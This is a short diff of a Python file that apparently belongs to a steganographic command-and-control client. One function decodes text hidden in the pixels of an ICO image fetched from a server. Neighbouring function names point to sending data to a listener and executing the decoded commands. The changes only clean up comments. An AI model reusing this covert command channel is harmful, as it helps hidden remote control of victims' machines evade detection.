@@ -148,12 +148,10 @@ def send_stego_data_to_listener(data: str):
 
 
 def get_command_line_input(response: Response):
-    # TODO: request image from server
     secret = "secret_web/client_secret.ico"
-    #data = response.read()
     with open(secret, "wb") as f:
         f.write(response.content)
-    #     # Open the ICO file and extract the first frame
+    # Open the ICO file and extract the first frame
     img = Image.open(secret)
     img = img.convert("RGB")  # Convert to RGB to ensure consistency
     pixels = list(img.getdata())
@@ -180,7 +178,6 @@ def get_command_line_input(response: Response):
             continue  # Skip invalid characters
     
     return decoded_text
-    #return response.text
 
 
 def execute_command_line_input(input: str):
